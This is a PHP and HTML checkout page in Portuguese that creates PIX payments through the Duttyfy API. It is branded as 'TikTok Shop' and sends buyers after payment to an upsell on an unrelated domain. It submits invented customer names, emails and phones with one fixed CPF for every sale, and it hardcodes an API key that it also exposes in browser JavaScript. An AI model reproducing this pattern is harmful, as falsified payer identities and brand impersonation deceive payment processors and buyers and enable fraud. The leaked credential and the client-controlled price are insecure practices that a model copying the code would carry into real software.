<?php
// ====== IOF • DUTTYFY PIX (arquivo único) ======
date_default_timezone_set('America/Fortaleza');

/* ===== CONFIG ===== */
$DUTTYFY_KEY            = 'w6i_CFgOWDoIJkHSK0lSBIDRmicmWBkMoLiPUW94UrOBgnm8Z18fVm2Q0d2dJP4zmFtCWzNimuGKcpOUN7YleA';
$PRODUCT_TITLE          = 'UP 2';
$AMOUNT_CENTS_DEFAULT   = 2190; // R$ 21,66
$UPSELL_URL             = 'https://blackdotik11.shop/tik/uppp3/';
/* =================== */

function cents_from_any($v, $fallback){
  if ($v === null || $v === '') return $fallback;
  if (preg_match('/^\d+$/', (string)$v)) return intval($v);
  $v = str_replace(['.', ','], ['.', '.'], $v);
  return max(0, (int)round((float)$v * 100));
}
function out_json($code, $data){
  http_response_code($code);
  header('Content-Type: application/json; charset=utf-8');
  echo json_encode($data, JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
  exit;
}

// ========= ENDPOINT AJAX: cria PIX =========
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

  $amount = cents_from_any($_POST['total_amount'] ?? null, $AMOUNT_CENTS_DEFAULT);
  if ($amount < 100) out_json(400, ['error'=>'Valor mínimo de R$ 1,00']);

  $utms = $_POST['utms'] ?? [];

  // ===== DADOS AUTOMÁTICOS (OBRIGATÓRIOS DUTTYFY) =====
  $nomes = ['Carlos','Lucas','Pedro','João','Rafael','Bruno','Diego','Matheus','Felipe','André'];
  $sobrenomes = ['Silva','Santos','Oliveira','Pereira','Costa','Rodrigues','Almeida','Lima'];

  $customerName  = $nomes[array_rand($nomes)].' '.$sobrenomes[array_rand($sobrenomes)];
  $customerCPF   = '11144477735'; // CPF válido
  $customerEmail = 'cliente'.mt_rand(10000,99999).'@gmail.com';
  $customerPhone = '859'.mt_rand(10000000,99999999);

  $payload = [
    "amount" => $amount,
    "description" => $PRODUCT_TITLE,
    "customer" => [
      "name"     => $customerName,
      "document" => $customerCPF,
      "email"    => $customerEmail,
      "phone"    => $customerPhone
    ],
    "item" => [
      "title" => $PRODUCT_TITLE,
      "price" => $amount,
      "quantity" => 1
    ],
    "paymentMethod" => "PIX",
    "utm" => !empty($utms) ? http_build_query($utms) : null
  ];

  $ch = curl_init("https://app.duttyfy.com.br/api-pix/$DUTTYFY_KEY");
  curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES),
    CURLOPT_TIMEOUT => 30
  ]);

  $resp = curl_exec($ch);
  $err  = curl_error($ch);
  curl_close($ch);

  if ($err) out_json(500, ['error'=>'cURL Error']);

  $j = json_decode($resp, true);
  if (!is_array($j) || empty($j['pixCode']) || empty($j['transactionId'])) {
    out_json(400, $j ?: ['error'=>'Erro ao gerar PIX']);
  }

  // 🔁 RESPOSTA NO MESMO FORMATO DA PARADISE
  out_json(200, [
    'hash' => $j['transactionId'],
    'pix'  => [
      'pix_qr_code' => $j['pixCode'],
      'expires_at'  => null
    ],
    'amount' => $amount
  ]);
}

$AMOUNT_CENTS = cents_from_any($_GET['amount'] ?? null, $AMOUNT_CENTS_DEFAULT);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pagamento PIX - TikTok Shop</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#ff0050 0%,#00f2ea 100%);min-height:100vh;padding:20px;display:flex;align-items:center;justify-content:center}
    .container{background:white;border-radius:20px;padding:25px;box-shadow:0 20px 40px rgba(0,0,0,0.1);max-width:380px;width:100%;text-align:center}
    .logo{height:24px;margin-bottom:15px}
    .icon-main{width:60px;height:60px;background:linear-gradient(135deg,#ff0050,#00f2ea);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 15px;color:white;font-size:24px}
    h1{color:#000;font-size:20px;font-weight:700;margin-bottom:8px}
    .subtitle{color:#666;font-size:13px;margin-bottom:20px;line-height:1.4}
    .amount-card{background:linear-gradient(135deg,#ff0050,#ff2a6d);color:white;padding:15px;border-radius:14px;margin-bottom:20px}
    .amount-label{font-size:13px;opacity:.9;margin-bottom:4px}
    .amount-value{font-size:28px;font-weight:800}
    .loading-section{padding:25px;background:#f8f9fa;border-radius:14px;margin-bottom:15px}
    .spinner{width:45px;height:45px;border:4px solid #e2e8f0;border-top:4px solid #ff0050;border-radius:50%;margin:0 auto 12px;animation:spin 1s linear infinite}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .loading-text{color:#ff0050;font-weight:600;font-size:15px}
    .qr-section{display:none;margin-bottom:15px}
    #qrcode {
  width: 204px;
  height: 204px;
  padding: 12px;
  background: #fff;
  border-radius: 14px;
  box-shadow: 0 5px 15px rgba(0,0,0,0.1);

  /* centralização perfeita */
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto;
}

    #qrcode canvas{width:180px!important;height:180px!important;border-radius:8px}
    .copy-section{display:none;margin-bottom:15px}
    .copy-input{width:100%;padding:12px;border:2px solid #e8e8e8;border-radius:10px;font-size:13px;margin-bottom:10px;background:#f8f9fa;font-family:monospace}
    .copy-btn{width:100%;padding:14px;background:linear-gradient(135deg,#00c853,#00e676);color:white;border:none;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:transform .2s}
    .copy-btn:active{transform:scale(.98)}
    .instructions{background:#f8f9fa;padding:15px;border-radius:10px;margin-top:15px}
    .instruction-item{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:13px;color:#555;line-height:1.4}
    .instruction-item:last-child{margin-bottom:0}
    .instruction-icon{width:22px;height:22px;background:#ff0050;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:11px;flex-shrink:0}
  </style>
</head>
<body>
<div class="container">
  <img src="/unnamed copy copy.png" alt="TikTok Shop" class="logo">
  <div class="icon-main"><i class="fas fa-qrcode"></i></div>
  <h1>Pagamento PIX</h1>
  <div class="subtitle">Escaneie o QR Code para pagar</div>

  <div class="amount-card">
    <div class="amount-label">Valor a pagar</div>
    <div class="amount-value">R$ <?= number_format($AMOUNT_CENTS/100,2,',','.') ?></div>
  </div>

  <div class="loading-section" id="loadingSection">
    <div class="spinner"></div>
    <div class="loading-text">Gerando PIX...</div>
  </div>

  <div class="qr-section" id="qrSection"><div id="qrcode"></div></div>

  <div class="copy-section" id="copySection">
    <input id="emv" class="copy-input" readonly placeholder="Código PIX será gerado aqui">
    <button id="btnCopy" class="copy-btn"><i class="fas fa-copy"></i> COPIAR CÓDIGO PIX</button>
  </div>

  <div class="instructions">
    <div class="instruction-item"><div class="instruction-icon"><i class="fas fa-camera"></i></div>Escaneie o QR Code</div>
    <div class="instruction-item"><div class="instruction-icon"><i class="fas fa-copy"></i></div>Ou copie o código PIX</div>
    <div class="instruction-item"><div class="instruction-icon"><i class="fas fa-check"></i></div>Pagamento aprovado em instantes</div>
  </div>
</div>

<script>
const AMOUNT = <?= (int)$AMOUNT_CENTS ?>;
const UPSELL = <?= json_encode($UPSELL_URL) ?>;
const DUTTY_KEY = <?= json_encode($DUTTYFY_KEY) ?>;

const utms = Object.fromEntries(new URLSearchParams(location.search));
const loadingSection=document.getElementById('loadingSection');
const qrSection=document.getElementById('qrSection');
const copySection=document.getElementById('copySection');
const emvInput=document.getElementById('emv');
const btnCopy=document.getElementById('btnCopy');
let pollTimer=null;

function buildQR(text){
  const box = document.getElementById('qrcode');
  box.innerHTML = '';

  // força visibilidade antes de renderizar
  box.style.display = 'block';

  new QRCode(box, {
    text: text,
    width: 180,
    height: 180,
    correctLevel: QRCode.CorrectLevel.M
  });
}


function startChecker(hash){
  clearInterval(pollTimer);
  pollTimer=setInterval(async()=>{
    try{
      const r=await fetch(`https://app.duttyfy.com.br/api-pix/${DUTTY_KEY}?transactionId=${hash}`);
      if(!r.ok) return;
      const d=await r.json();
      if(d.status==='COMPLETED'){
        clearInterval(pollTimer);
        loadingSection.innerHTML='<div style="color:#00c853;font-size:16px;font-weight:600;padding:15px 0"><i class="fas fa-check-circle" style="font-size:22px;display:block;margin-bottom:8px"></i>Pagamento aprovado!</div>';
        if(UPSELL){
          const p=new URLSearchParams(utms);p.append('fpay',hash);
          setTimeout(()=>location.href=UPSELL+(UPSELL.includes('?')?'&':'?')+p.toString(),2000);
        }
      }
    }catch(e){}
  },1500);
}

async function generatePix(){
  try{
    const fd=new FormData();
    fd.append('total_amount',AMOUNT);
    for(const k in utms){ if(utms[k]) fd.append('utms['+k+']',utms[k]); }
    const r=await fetch(location.href,{method:'POST',body:fd});
    const j=await r.json();
    if(!r.ok) throw new Error(j?.error||'Erro ao gerar PIX');
    loadingSection.style.display = 'none';
qrSection.style.display = 'block';
copySection.style.display = 'block';

emvInput.value = j.pix.pix_qr_code;

// espera o DOM aplicar display:block
setTimeout(() => {
  buildQR(j.pix.pix_qr_code);
}, 50);

startChecker(j.hash);

  }catch(e){
    loadingSection.innerHTML='<div style="color:#ff0050;font-size:14px;font-weight:600;padding:15px 0;">Erro ao gerar PIX</div>';
  }
}

btnCopy.addEventListener('click', ()=>{
  const t=emvInput.value||'';
  if(!t) return;
  if(navigator.clipboard && window.isSecureContext){
    navigator.clipboard.writeText(t).then(()=>{
      const o=btnCopy.innerHTML;
      btnCopy.innerHTML='<i class="fas fa-check"></i> CÓDIGO COPIADO!';
      setTimeout(()=>btnCopy.innerHTML=o,2000);
    });
  }else{
    const ta=document.createElement('textarea');
    ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
    const o=btnCopy.innerHTML;
    btnCopy.innerHTML='<i class="fas fa-check"></i> CÓDIGO COPIADO!';
    setTimeout(()=>btnCopy.innerHTML=o,2000);
  }
});

setTimeout(generatePix,1000);
</script>
</body>
</html>
